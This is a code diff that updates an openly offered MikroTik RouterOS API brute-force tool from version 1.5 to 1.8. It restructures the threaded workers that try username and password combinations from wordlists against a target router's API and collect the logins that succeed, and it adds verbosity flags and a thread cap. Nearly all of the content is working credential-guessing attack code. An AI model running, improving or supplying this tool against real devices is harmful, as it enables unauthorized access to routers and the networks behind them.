@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Version: 1.5
-
-_version = "1.5"
+_version = "1.8"
 
 import time, argparse, threading, concurrent.futures
 from datetime import datetime
@@ -21,9 +19,8 @@ except ModuleNotFoundError:
 def current_time():
     return datetime.now().strftime("%H:%M:%S")
 
-
 class Bruteforce:
-    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=5):
+    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=2, verbose=False, verbose_all=False):
         self.target = target
         self.port = port
         self.usernames = usernames
@@ -31,11 +28,15 @@ class Bruteforce:
         self.combo_dict = combo_dict
         self.delay = delay
         self.use_ssl = use_ssl
-        self.max_workers = max_workers
-        self.log = Log(True, None, None)
+        self.max_workers = min(max_workers, 15)
+        self.verbose = verbose
+        self.verbose_all = verbose_all
+        self.log = Log(verbose=verbose, verbose_all=verbose_all)
         self.wordlist = []
         self.successes = []
         self.lock = threading.Lock()
+        self.index_lock = threading.Lock()
+        self.index = 0
         self.load_wordlist()
 
     def load_file(self, path):
@@ -79,26 +80,42 @@ class Bruteforce:
             self.log.error(f"Error loading wordlist: {e}")
             exit(1)
 
-    def attempt_login(self, index, user, password):
-        try:
-            api = Api(self.target, self.port, use_ssl=self.use_ssl)
-            result = api.login(user, password)
-            if result:
-                with self.lock:
-                    self.successes.append((user, password))
-                self.log.success(f"Current testing -> {user}:{password}")
-            else:
-                self.log.fail(f"Current testing -> {user}:{password}")
-        except Exception as e:
-            self.log.warning(f"Error trying password '{password}': {e}")
-        time.sleep(self.delay)
+        self.wordlist = list(dict.fromkeys(self.wordlist))
+
+    def get_next_combo(self):
+        with self.index_lock:
+            if self.index >= len(self.wordlist):
+                return None
+            combo = self.wordlist[self.index]
+            self.index += 1
+            return combo
+
+    def worker(self):
+        while True:
+            combo = self.get_next_combo()
+            if combo is None:
+                break
+            user, password = combo
+            try:
+                api = Api(self.target, self.port, use_ssl=self.use_ssl)
+                result = api.login(user, password)
+                if result:
+                    with self.lock:
+                        self.successes.append((user, password))
+                    self.log.success(f"Current testing -> {user}:{password}")
+                elif self.verbose:
+                    self.log.fail(f"Current testing -> {user}:{password}")
+            except Exception as e:
+                if self.verbose_all:
+                    self.log.warning(f"Error trying password '{password}': {e}")
+            time.sleep(self.delay)
 
     def run(self):
         self.log.info("[*] Starting brute force attack...")
         self.log.info(f"[*] Total Attempts {len(self.wordlist)}...")
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-            futures = [executor.submit(self.attempt_login, idx, user, pwd) for idx, (user, pwd) in enumerate(self.wordlist)]
+            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
             concurrent.futures.wait(futures)
 
         self.log.info("[*] Attack finished.\n")
@@ -108,15 +125,14 @@ class Bruteforce:
             deduped = list(dict.fromkeys(self.successes))
             max_user = max(len(u) for u, _ in deduped)
             max_pass = max(len(p) for _, p in deduped)
-            print(f"{'-'*4}+{'-'*(max_user+3)}+{'-'*(max_pass+2)}")
-            print(f"{'ORD':<3} |  {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}}")
-            print(f"{'-'*4}+{'-'*(max_user+3)}+{'-'*(max_pass+2)}")
+            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}")
+            print(f"ORD | {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}}")
+            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}")
             for idx, (user, pwd) in enumerate(deduped, start=1):
-                print(f"{idx:03} | {user:^{max_user}}  | {pwd:^{max_pass}}")
+                print(f"{idx:03} | {user:^{max_user}} | {pwd:^{max_pass}}")
             print("\nAttack completed successfully.\n")
         else:
             print("\nNo credentials were validated successfully with the given users and passwords.\n")
-
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
@@ -129,17 +145,19 @@ if __name__ == "__main__":
     parser.add_argument("-d", "--dictionary", help="Path to combo dictionary (user:pass)")
     parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
     parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
-    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
+    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed and warning attempts")
+    parser.add_argument("-vv", "--verbose-all", action="store_true", help="Show debug and error messages")
     args = parser.parse_args()
 
-    print("""
-        __  __ _ _              _   _ _        _    ____ ___      ____  _____
+    print(f"""
+         __  __ _ _              _   _ _        _    ____ ___      ____  _____
         |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
         | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
         | |  | | |   <| | | (_) | |_| |   <  / ___ \|  __/| |_____| |_) |  _|
         |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|
 
-                   Mikrotik RouterOS API Bruteforce Tool v""",_version,"""
+                    Mikrotik RouterOS API Bruteforce Tool v{_version}
                      André Henrique (X / Linkedin: @mrhenrike)
             Please report tips, suggests and problems to X or LinkedIn
                     https://github.com/mrhenrike/MikrotikAPI-BF
@@ -156,7 +174,9 @@ if __name__ == "__main__":
         combo_dict=args.dictionary,
         delay=args.seconds,
         use_ssl=args.ssl,
-        max_workers=args.threads
+        max_workers=args.threads,
+        verbose=args.verbose,
+        verbose_all=args.verbose_all
     )
 
     try:
